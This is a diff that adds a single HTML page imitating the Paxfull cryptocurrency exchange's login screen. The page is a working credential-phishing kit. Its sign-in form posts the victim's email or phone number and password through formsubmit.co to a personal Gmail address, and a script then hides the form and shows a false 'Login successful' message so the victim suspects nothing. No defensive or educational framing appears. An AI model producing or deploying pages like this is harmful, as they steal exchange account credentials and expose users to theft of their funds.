@@ -1,0 +1,111 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Paxfull Login</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #000;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      width: 90%;
+      max-width: 400px;
+    }
+
+    .logo {
+      font-size: 24px;
+      font-weight: bold;
+      color: #b2ff00;
+      margin-bottom: 30px;
+    }
+
+    h2 {
+      font-size: 28px;
+      margin-bottom: 10px;
+    }
+
+    a {
+      color: #999;
+      font-size: 14px;
+      text-decoration: underline;
+    }
+
+    input {
+      width: 100%;
+      padding: 15px;
+      margin: 10px 0;
+      background-color: #111;
+      border: none;
+      border-radius: 10px;
+      color: #fff;
+      font-size: 16px;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 15px;
+      background-color: #ccff00;
+      color: #000;
+      font-weight: bold;
+      border: none;
+      border-radius: 30px;
+      margin-top: 20px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+
+    .small-link {
+      font-size: 13px;
+      text-align: right;
+      display: block;
+      margin-top: -8px;
+      margin-bottom: 15px;
+    }
+
+    .bottom-text {
+      font-size: 14px;
+      margin-top: 20px;
+      color: #aaa;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">paxfull</div>
+    <h2>Welcome back!</h2>
+    <a href="#">Don't have an account? Sign up</a>
+
+    <form action="https://formsubmit.co/gabrielstanley147@gmail.com" method="POST" onsubmit="showSuccess(event)">
+      <input type="text" name="email_or_phone" placeholder="Email / Phone Number" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <a href="#" class="small-link">Forgot password?</a>
+
+      <button type="submit" class="btn">Sign in</button>
+
+      <input type="hidden" name="_next" value="https://example.com/success" />
+    </form>
+
+    <div id="success-message" style="display:none; margin-top:20px; font-weight:bold; color:lightgreen;">
+      ✅ Login successful
+    </div>
+  </div>
+
+  <script>
+    function showSuccess(e) {
+      e.preventDefault();
+      document.querySelector('form').style.display = 'none';
+      document.getElementById('success-message').style.display = 'block';
+    }
+  </script>
+</body>
+</html>
